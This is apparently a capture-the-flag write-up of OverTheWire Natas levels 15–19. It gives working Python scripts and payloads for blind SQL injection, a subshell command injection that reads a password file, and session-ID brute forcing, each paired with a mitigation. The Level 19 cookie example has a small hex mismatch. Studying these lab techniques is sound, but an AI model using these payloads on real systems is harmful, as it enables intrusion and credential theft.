
## Level 15 → Level 16

**Title:** Boolean-Based Blind SQL Injection with Python Brute Force

**Summary:**
This one took the SQL injection from Level 14 and made it significantly harder. The application is still vulnerable to SQLi — but this time, the server doesn't display query results or error messages. It only tells you whether a user "exists" or not. That binary yes/no response is enough to extract the entire password, one character at a time, using a technique called Boolean-Based Blind SQL Injection. This was the first level where I had to write a script to get anywhere.

---

### Steps to Reproduce
1. Log in at `http://natas15.natas.labs.overthewire.org`
2. View the source — the query takes only a username and returns "This user exists." or "This user doesn't exist."
3. The injection point is the `username` field. Test it manually first:
   ```
   natas16" AND 1=1 #
   ```
   The server responds "This user exists." — confirming injection works
4. Use `LIKE BINARY` to check individual characters of the password. For example:
   ```sql
   natas16" AND password LIKE BINARY "a%" #
   ```
   If the response is "This user exists.", the password starts with `a`. Otherwise, try the next character.
5. Automate this with a Python script:
   ```python
   import requests

   url = "http://natas15.natas.labs.overthewire.org"
   auth = ("natas15", "[password]")
   charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
   password = ""

   while len(password) < 32:
       for char in charset:
           payload = f'natas16" AND password LIKE BINARY "{password}{char}%" #'
           r = requests.post(url, data={"username": payload}, auth=auth)
           if "This user exists." in r.text:
               password += char
               print(f"[+] Found so far: {password}")
               break

   print(f"[*] Password: {password}")
   ```
6. Run the script — it iterates through characters until all 32 are confirmed

---

### Impact
Blind SQL Injection is more dangerous than it looks. The absence of visible output doesn't protect the database — it just slows the attacker down. Given enough requests, a blind injection can extract an entire database without a single error message being shown. Automated tools like `sqlmap` can do this in minutes against a vulnerable endpoint.

---

### Mitigation
Same root cause as Level 14 — unsanitized input concatenated into a SQL query. The fix is identical: use prepared statements (parameterized queries) so user input is never interpreted as SQL. Input validation and an allowlist for expected characters are useful secondary controls, but they don't replace parameterized queries.

---

### Takeaways
- Blind SQLi requires patience — or a script. Learning to automate repetitive tasks in Python is as important as understanding the vulnerability itself.
- `LIKE BINARY` is case-sensitive in MySQL, which matters when the charset includes both upper and lowercase characters.
- "No output" doesn't mean "no vulnerability." A yes/no signal is still enough to leak data, just more slowly.

---
---

## Level 16 → Level 17

**Title:** Command Injection via Subshell Inside a Heavily Filtered grep

**Summary:**
This is Level 10 with a much tighter filter. Almost every useful shell metacharacter is now blocked — semicolons, pipes, ampersands, backticks, single and double quotes are all off the table. But the search box still passes input directly into a `grep` command, and there's one construct that slips through: `$(...)`. A subshell lets us run a command inside the argument, and we can use `grep`'s own output to create a side-channel that leaks the password character by character.

---

### Steps to Reproduce
1. Log in at `http://natas16.natas.labs.overthewire.org`
2. View the source — the filter is now:
   ```php
   if(preg_match('/[;|&`\'"]/',$key)) {
       print "Input contains an illegal character!";
   }
   ```
   No semicolons, pipes, ampersands, backticks, or quotes — but `$()` subshells are still allowed
3. The trick: use a nested `grep` inside a subshell to conditionally match or not match a word in the dictionary. If the password character is correct, the inner grep returns a string that causes the outer grep to return no results. If it's wrong, the outer grep returns results as normal.

   Test payload in the search box:
   ```
   $(grep -E ^a.* /etc/natas_webpass/natas17)hello
   ```
   The full command becomes:
   ```bash
   grep -i "$(grep -E ^a.* /etc/natas_webpass/natas17)hello" dictionary.txt
   ```
   - If the password starts with `a`, the inner grep returns the full password, and the outer grep searches for `[password]hello` — which doesn't exist in the dictionary. **Empty result = character confirmed.**
   - If the password doesn't start with `a`, the inner grep returns nothing, and the outer grep searches for just `hello` — which does exist. **Results shown = wrong character.**

4. Automate with a Python script:
   ```python
   import requests

   url = "http://natas16.natas.labs.overthewire.org"
   auth = ("natas16", "[password]")
   charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
   password = ""

   while len(password) < 32:
       for char in charset:
           payload = f"$(grep -E ^{password}{char}.* /etc/natas_webpass/natas17)hello"
           r = requests.get(url, params={"needle": payload}, auth=auth)
           if "hello" not in r.text:
               password += char
               print(f"[+] Found so far: {password}")
               break

   print(f"[*] Password: {password}")
   ```

---

### Impact
This technique — using a program's output as a side-channel — is a real attack pattern. The application thought blocking obvious injection characters was enough. It wasn't. The subshell construct bypassed all of it. In a real environment, this level of command injection could escalate to reading sensitive files, establishing persistence, or pivoting to other services on the same host.

---

### Mitigation
Blocklists are inherently incomplete. The only real fix is to not pass user input to the shell at all. For a word-search feature, PHP has native string functions and regex that can search file content without ever spawning a shell process. `escapeshellarg()` would also have neutralised this specific attack by wrapping the input in single quotes, making the subshell literal text rather than executable syntax.

---

### Takeaways
- `$()` subshells can survive aggressive character filters — always test them even when the obvious payloads are blocked.
- Side-channel attacks don't need direct output. The presence or absence of data in a response is often enough.
- This level is a good example of creative thinking under constraints — a skill that translates directly to real-world pentesting.

---
---

## Level 17 → Level 18

**Title:** Time-Based Blind SQL Injection

**Summary:**
Same blind injection concept as Level 15, but now the server gives away absolutely nothing. There's no "user exists" message — the output is completely suppressed regardless of what the query returns. The only signal left is time. By injecting `SLEEP()` into the SQL query, we can make the server pause when a condition is true and respond immediately when it's false. That delay becomes our data channel.

---

### Steps to Reproduce
1. Log in at `http://natas17.natas.labs.overthewire.org`
2. View the source — the query is identical to Level 15, but all echo statements are commented out. There's no visible feedback at all.
3. Test that injection is possible and that timing works:
   ```sql
   natas18" AND SLEEP(5) #
   ```
   If the server takes ~5 seconds to respond, the injection is confirmed
4. Now use `IF()` with `SLEEP()` to ask a yes/no question:
   ```sql
   natas18" AND IF(password LIKE BINARY "a%", SLEEP(5), NULL) #
   ```
   - ~5 second delay = password starts with `a` (true)
   - Instant response = wrong character (false)
5. Automate with Python, measuring response time:
   ```python
   import requests
   import time

   url = "http://natas17.natas.labs.overthewire.org"
   auth = ("natas17", "[password]")
   charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
   password = ""

   while len(password) < 32:
       for char in charset:
           payload = f'natas18" AND IF(password LIKE BINARY "{password}{char}%", SLEEP(3), NULL) #'
           start = time.time()
           requests.post(url, data={"username": payload}, auth=auth)
           elapsed = time.time() - start
           if elapsed >= 3:
               password += char
               print(f"[+] Found so far: {password}")
               break

   print(f"[*] Password: {password}")
   ```

---

### Impact
Time-based blind injection is one of the stealthier SQLi techniques — it leaves minimal traces in application logs since there's no visible error or changed output. It's slower than other methods but works even when the application is completely silent. Real-world scanners and tools like `sqlmap` include time-based detection specifically because blind injection this way remains exploitable even against well-hardened response handling.

---

### Mitigation
Again — parameterized queries. The entire class of SQL injection vulnerabilities, from basic to blind to time-based, is eliminated by separating query structure from user-supplied data. No amount of output suppression changes the underlying flaw; it only makes exploitation slower.

---

### Takeaways
- When there's no visible output, look for other signals — timing, error codes, page size differences, or response headers.
- Time-based injection requires careful threshold tuning. Network latency can cause false positives, so a sleep value higher than typical response time is important.
- This is the third SQLi variation in a row — Level 14 (basic), Level 15 (boolean blind), Level 17 (time-based). Knowing all three and how they relate is genuinely useful for interviews and real assessments.

---
---

## Level 18 → Level 19

**Title:** Session Hijacking via Sequential Session ID Brute Force

**Summary:**
The page grants admin access based on session ID — and the session IDs are assigned sequentially as plain integers, capped at 640. If the admin happens to have an active session somewhere in that range, we can find it by iterating through all 640 possible values and checking which one returns the admin view. No password needed.

---

### Steps to Reproduce
1. Log in at `http://natas18.natas.labs.overthewire.org`
2. View the source — the session ID is a number between 1 and 640, assigned sequentially:
   ```php
   $maxid = 640;
   // ...
   $_SESSION["admin"] = 0;
   ```
   The admin session exists somewhere in that range
3. The page checks `$_SESSION["admin"] == 1` to display credentials
4. Use Burp Suite's **Intruder** tool:
   - Intercept a request to the page
   - Send it to Intruder
   - Mark the `PHPSESSID` cookie value as the injection point
   - Set the payload to a number range from 1 to 640
   - Start the attack and filter responses by length — the admin response will be noticeably longer
5. Or script it in Python:
   ```python
   import requests

   url = "http://natas18.natas.labs.overthewire.org"
   auth = ("natas18", "[password]")

   for session_id in range(1, 641):
       cookies = {"PHPSESSID": str(session_id)}
       r = requests.get(url, auth=auth, cookies=cookies)
       if "You are an admin." in r.text:
           print(f"[+] Admin session ID: {session_id}")
           print(r.text)
           break
   ```

---

### Impact
Predictable session IDs are a well-documented vulnerability class. Sequential integers, timestamps, or other low-entropy values make session IDs guessable. In a real application, any user could brute-force their way into another user's session — including an admin's — without ever knowing their password. This is session hijacking in its simplest form.

---

### Mitigation
Session IDs must be generated using a cryptographically secure random number generator and be long enough to make brute force impractical (at least 128 bits of entropy). PHP's `session_start()` with default settings in modern versions does this correctly — but custom session implementations often don't. Additionally, sessions should expire after a reasonable period of inactivity and be invalidated on logout.

---

### Takeaways
- Session IDs are the keys to user accounts. Treat their generation with the same seriousness as password hashing.
- Sequential integers as session IDs are essentially no security at all — 640 requests is nothing.
- Burp Intruder and a short Python script can both cover this range in seconds. Neither requires any special knowledge of the target.

---
---

## Level 19 → Level 20

**Title:** Session Hijacking with Hex-Encoded Non-Sequential Session IDs

**Summary:**
Level 19 looks identical to Level 18 — same admin check, same brute force concept. But the session IDs are no longer plain integers. Intercepting a request reveals that the `PHPSESSID` is hex-encoded and includes a username suffix, formatted as `[number]-[username]` encoded in hex. Once the encoding scheme is understood, the brute force is straightforward again — just generate the right format for each ID and try them all.

---

### Steps to Reproduce
1. Log in at `http://natas19.natas.labs.overthewire.org`
2. Intercept a request and inspect the `PHPSESSID` cookie — it looks like:
   ```
   3232322d61646d696e
   ```
3. Decode it from hex:
   ```
   322-admin  →  hex: 3332322d61646d696e
   ```
   The format is `[number]-[username]` hex-encoded
4. The range is still 1 to 640. Generate hex-encoded session IDs for `[number]-admin` and iterate:
   ```python
   import requests

   url = "http://natas19.natas.labs.overthewire.org"
   auth = ("natas19", "[password]")

   for i in range(1, 641):
       session_str = f"{i}-admin"
       session_hex = session_str.encode().hex()
       cookies = {"PHPSESSID": session_hex}
       r = requests.get(url, auth=auth, cookies=cookies)
       if "You are an admin." in r.text:
           print(f"[+] Found session ID: {i} → {session_hex}")
           print(r.text)
           break
   ```
5. The script finds the matching ID and the password for natas20 is displayed

---

### Impact
Encoding session IDs doesn't make them more secure — it just makes them look less obvious at first glance. The underlying entropy is exactly the same as Level 18: a number between 1 and 640. This is security through obscurity applied to session management, which is just as ineffective here as everywhere else. An attacker who takes 30 seconds to decode one sample session ID can immediately adapt their brute force.

---

### Mitigation
Hex encoding, base64, or any other reversible transformation of a weak session ID produces a weak session ID. The only thing that makes a session ID secure is entropy — specifically, that it's generated from a cryptographically random source with enough bits that guessing is computationally infeasible. The structure, format, or encoding of the ID is irrelevant to its security.

---

### Takeaways
- Encoding is not obfuscation, and obfuscation is not security. Decode first, analyze second.
- When you see a cookie value that doesn't look like plaintext, always try hex decode, base64 decode, or URL decode before assuming it's random.
- Levels 18 and 19 teach the same lesson from two slightly different angles — the encoding in 19 is a red herring that delays but doesn't stop the attack.

---

*More levels coming soon. This document is actively updated as I work through the series.*
